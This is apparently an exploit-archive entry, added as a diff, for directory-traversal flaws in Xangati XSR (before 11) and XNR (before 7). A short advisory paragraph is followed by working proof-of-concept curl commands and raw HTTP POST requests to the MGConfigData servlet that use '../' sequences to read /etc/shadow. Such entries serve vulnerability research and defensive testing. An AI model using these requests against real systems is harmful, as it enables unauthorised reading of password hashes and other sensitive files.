@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/66817/info
+
+Xangati XSR And XNR are prone to a multiple directory-traversal vulnerabilities.
+
+A remote attacker could exploit these vulnerabilities using directory-traversal characters ('../') to access or read arbitrary files that contain sensitive information.
+
+Xangati XSR prior to 11 and XNR prior to 7 are vulnerable. 
+
+curl -i -s -k  -X 'POST' \
+-H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Java/1.7.0_25' \
+--data-binary $'key=foo&request=getUpgradeStatus&file=%2Ffloodguard%2Freports%2F../../../../../etc/shadow' \
+'hxxps://www.example.com/servlet/MGConfigData'
+
+POST /servlet/MGConfigData HTTP/1.1
+key=validkey&request=download&download=%2Ffloodguard%2Fdata%2F../../../../../../etc/shadow&updLaterThan=0&head=0&start=0&limit=4950&remote=www.example.com
+
+POST /servlet/MGConfigData HTTP/1.1
+key=validkey&request=port_svc&download=%2Ffloodguard%2Fdata%2F../../../../../../../etc/shadow&updLaterThan=0&remote=www.example.com
+
+curl -i -s -k  -X 'POST' \
+-H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Java/1.7.0_25' \
+--data-binary $'key=validkey&binfile=%2Fourlogs%2F../../../../../../../../../etc/shadow' \
+'hxxps://www.example.com/servlet/MGConfigData'
